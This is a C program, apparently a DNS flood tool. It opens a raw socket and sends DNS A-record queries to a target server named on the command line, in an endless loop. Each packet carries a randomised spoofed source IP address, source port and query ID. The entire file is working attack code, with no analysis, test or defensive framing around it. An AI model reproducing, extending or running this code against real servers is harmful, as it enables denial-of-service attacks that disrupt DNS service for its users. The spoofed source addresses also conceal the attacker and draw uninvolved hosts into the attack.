#define _BSD_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/wait.h>
#include <getopt.h>

#define	  CLASS_INET 1

enum dns_type {
	TYPE_A = 1,
};

typedef struct type_name{
	uint16_t type;
	char typename[10];
} type_name_t;

type_name_t dns_type_names [] = {
	{TYPE_A, "A"},		
};

#define DNS_TYPE_NUM (sizeof(dns_type_names) / sizeof(type_name_t))

struct dnshdr {
	unsigned short int id;

	unsigned char rd:1;				/* recursion desired */
	unsigned char tc:1;				/* truncated message */
	unsigned char aa:1;				/* authoritive answer */
	unsigned char opcode:4;			/* purpose of message */
	unsigned char qr:1;				/* response flag */

	unsigned char rcode:4;			/* response code */
	unsigned char unused:2;			/* unused bits */
	unsigned char pr:1;				/* primary server required (non standard) */
	unsigned char ra:1;				/* recursion available */

	unsigned short int que_num;
	unsigned short int rep_num;
	unsigned short int num_rr;
	unsigned short int num_rrsup;
};

void command_err(char *progname){
	printf("Expected Command: %s <query_name(i.e. bogus_query.com)> <destination_ip(ip_of_DNS_Server)>\n", progname);
}

void nameformat(char *name, char *QS){
	char *bungle, *x;
	char elem[128];

	*QS = 0;
	bungle = malloc(strlen(name) + 3);
	strcpy(bungle, name);
	x = strtok(bungle, ".");
	while (x != NULL) {
		if (snprintf(elem, 128, "%c%s", strlen(x), x) == 128) {
			puts("String overflow.");
			exit(1);
		}
		strcat(QS, elem);
		x = strtok(NULL, ".");
	}
	free(bungle);
}

int make_question_packet(char *data, char *name){
	nameformat(name, data);
	*((u_short *) (data + strlen(data) + 1)) = htons(TYPE_A);
	*((u_short *) (data + strlen(data) + 3)) = htons(CLASS_INET);
	return (strlen(data) + 5);
}

int main(int argc, char **argv){
	char qname[256] = {0};													/* question name    		*/
	struct in_addr src_ip = {0};											/* source address          	*/
	struct sockaddr_in sin_dst = {0};										/* destination sock address	*/
	u_short src_port = 0;													/* source port             	*/
	u_short dst_port = 53;													/* destination port        	*/
	int sock;																/* socket to write on      	*/

	int random_ip = 0;
	int static_ip = 0;
	random_ip = 1;
	srandom((unsigned long)time(NULL));

	int arg_options;

	int quit = 0;
	const int on = 1;

	char *from, *to;
	int itmp = 0;

	unsigned char packet[2048] = {0};
	struct ip *iphdr;
	struct udphdr *udp;
	struct dnshdr *dns_header;
	char *dns_data;

	/* query name */
	if (optind < argc) {
		strcpy(qname, argv[optind]);
	} else {
		quit = 1;
	}

	optind++;

	/* target IP */
	if (optind < argc) {
		inet_pton(AF_INET, argv[optind], &sin_dst.sin_addr);
	} else {
		quit = 1;
	}

	if (quit || !sin_dst.sin_addr.s_addr) {
		command_err(argv[0]);
		exit(0);
	}

	/* check root user */
	if (getuid() != 0) {
		printf("This program must run as root privilege.\n");
		exit(1);
	}

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
		printf("\n%s\n", "Create RAW socket failed\n");
		exit(1);
	}

	if ((setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)))== -1) {
		perror("setsockopt");
		exit(-1);
	}

	sin_dst.sin_family = AF_INET;
	sin_dst.sin_port = htons(dst_port);

	iphdr = (struct ip *)packet;
	udp = (struct udphdr *)((char *)iphdr + sizeof(struct ip));
	dns_header = (struct dnshdr *)((char *)udp + sizeof(struct udphdr));
	dns_data = (char *)((char *)dns_header + sizeof(struct dnshdr));

	/* the fixed fields for DNS header */
	dns_header->rd = 1;
	dns_header->que_num = htons(1);
	dns_header->qr = 0;			/* qr = 0: question packet   */
	dns_header->aa = 0;			/* aa = 0: not auth answer   */
	dns_header->rep_num = htons(0);	/* sending no replies        */

	/* the fixed fields for UDP header */
	udp->uh_dport = htons(dst_port);
	if (src_port) {
		udp->uh_sport = htons(src_port);
	}

	/* the fixed fields for IP header */
	iphdr->ip_dst.s_addr = sin_dst.sin_addr.s_addr;
	iphdr->ip_v = IPVERSION;
	iphdr->ip_hl = sizeof(struct ip) >> 2;
	iphdr->ip_ttl = 245;
	iphdr->ip_p = IPPROTO_UDP;

	while (1) {
		int dns_datalen;
		int udp_datalen;
		int ip_datalen;

		ssize_t ret;

		if (random_ip) {
			src_ip.s_addr = random();
		}

		dns_header->id = random();
		dns_datalen = make_question_packet(dns_data, qname);

		udp_datalen = sizeof(struct dnshdr) + dns_datalen;
		ip_datalen = sizeof(struct udphdr) + udp_datalen;

		/* update UDP header*/
		if (!src_port) {
			udp->uh_sport = htons(random() % 65535);
		}
		udp->uh_ulen = htons(sizeof(struct udphdr) + udp_datalen);
		udp->uh_sum = 0;

		/* update IP header */
		iphdr->ip_src.s_addr = src_ip.s_addr;
		iphdr->ip_id = random() % 5985;
		iphdr->ip_len = sizeof(struct ip) + ip_datalen;
		iphdr->ip_sum = 0;

		ret = sendto(sock, iphdr, sizeof(struct ip) + ip_datalen, 0,(struct sockaddr *) &sin_dst, sizeof(struct sockaddr));
		if (ret == -1) {
			printf("Query Sending to DNS failed.\n");
		}
	}
	return 0;
}
